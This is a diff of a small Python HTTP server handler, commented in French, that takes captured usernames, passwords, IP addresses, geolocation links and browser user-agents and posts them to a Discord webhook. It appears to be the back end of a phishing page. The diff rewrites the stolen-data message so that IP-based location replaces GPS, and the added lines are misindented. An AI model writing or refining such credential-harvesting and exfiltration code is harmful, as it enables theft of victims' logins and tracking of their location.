@@ -19,13 +19,14 @@ class MyHandler(SimpleHTTPRequestHandler):
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
             # Envoi vers Discord
-            msg = (
-                f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\n"
-                f"Utilisateur : {data.get('username')}\n"
-                f"Mot de passe : {data.get('password')}\n"
-                f"GPS : {data.get('location')}\n"
-                f"User-Agent : {data.get('userAgent')}"
-            )
+           msg = (
+        f"--- NOUVELLE CONNEXION [{now}] ---\n"
+        f"Utilisateur : {data.get('username')}\n"
+        f"Mot de passe : {data.get('password')}\n"
+        f"Adresse IP : {data.get('ip')}\n"
+        f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
+        f"User-Agent : {data.get('userAgent')}"
+    )
             payload = json.dumps({"content": msg}).encode('utf-8')
             req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
             try:
